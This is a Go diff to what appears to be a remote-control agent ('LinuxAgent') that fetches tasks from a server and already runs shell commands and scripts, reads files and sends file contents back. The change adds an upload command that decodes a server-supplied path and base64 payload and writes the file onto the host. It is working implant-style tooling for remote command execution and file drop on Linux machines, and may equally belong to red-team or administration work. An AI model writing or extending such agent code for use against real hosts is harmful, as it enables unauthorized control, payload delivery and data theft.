@@ -21,7 +21,7 @@ import (
 	"strconv"
 	"strings"
 	"sync"
-	"time"
+	"time"	
 )
 
 const (
@@ -32,11 +32,13 @@ const (
 	AGENT_POST_TASK       = "post_task"
 	AGENT_SEND_BASE64     = "base64"
 	AGENT_DOWNLOADFILE    = "download_file"
+	AGENT_UPLOADFILE      = "upload_file"
 	AGENT_SLEEP_SECOND    = 3
 	COMMAND_CAT_FILE      = 0x156
 	COMMAND_SHELL         = 0x152
 	COMMAND_SHELL_SCRIPT  = 0x151
 	COMMAND_DOWNLOAD      = 0x153
+	COMMAND_UPLOAD        = 0x154
 )
 
 type Agent interface {
@@ -55,6 +57,7 @@ type Agent interface {
 	ExecuteScript(shell string, command string, timeout time.Duration) string
 	CatFile(path string) string
 	ReadFile(path string) []byte
+	WriteFile(path string, content []byte) string
 	Register() bool
 	GetTask() []byte
 	PostTask(taskPackage TaskPackage) []byte
@@ -231,6 +234,7 @@ func (agent *LinuxAgent) GetOSVersion() string {
 		version = matches[1]
 	} else {
 		version = runtime.GOOS
+		// prevent server split osversion index issue
 		version += ".1.1.1"
 	}
 	return version
@@ -323,6 +327,30 @@ func (agent *LinuxAgent) DispatcherTask() {
 				taskData.Task = AGENT_DOWNLOADFILE
 				taskData.Data = content
 				taskData.External = file
+				break
+			case COMMAND_UPLOAD:
+				idx := 8			
+				remote_file_path_size := int(binary.LittleEndian.Uint32(commands[idx:idx+4]))
+				idx += 4
+				remote_file_path := strings.Trim(string(commands[idx:idx+remote_file_path_size]), "\x00")				
+				
+				log.Println("Upload Remote File Path Size: ", remote_file_path_size)
+				log.Println("Upload Remote File Path: ", remote_file_path)
+				
+				// IsFilePath=True, will get content and 4 byptes for length
+				idx += remote_file_path_size				
+				file_base64_size := int(binary.LittleEndian.Uint32(commands[idx:idx+4]))
+				idx += 4
+				file_base64 := strings.Trim(string(commands[idx:]), "\x00")
+				log.Println("File Base64 Size: ", file_base64_size)
+				// log.Println("File Base64: ", file_base64)
+
+				file_content := Base64Decode(file_base64)
+				
+				taskData.Task = AGENT_UPLOADFILE
+				taskData.Data = agent.WriteFile(remote_file_path, file_content)
+				taskData.External = file_base64_size
+				break
 			}
 			// 将任务结果数据发送回去
 			agent.TaskDataChannel <- taskData
@@ -450,4 +478,12 @@ func (agent *LinuxAgent) ReadFile(path string) []byte {
 		return []byte(err.Error())
 	}
 	return content
+}
+
+func (agent *LinuxAgent) WriteFile(path string, content []byte) string {
+	err := os.WriteFile(path, content, 0644)
+	if err != nil {
+		return err.Error()
+	}
+	return fmt.Sprintf("File writtern to %s successfully (length: %d bytes)", path, len(content))
 }
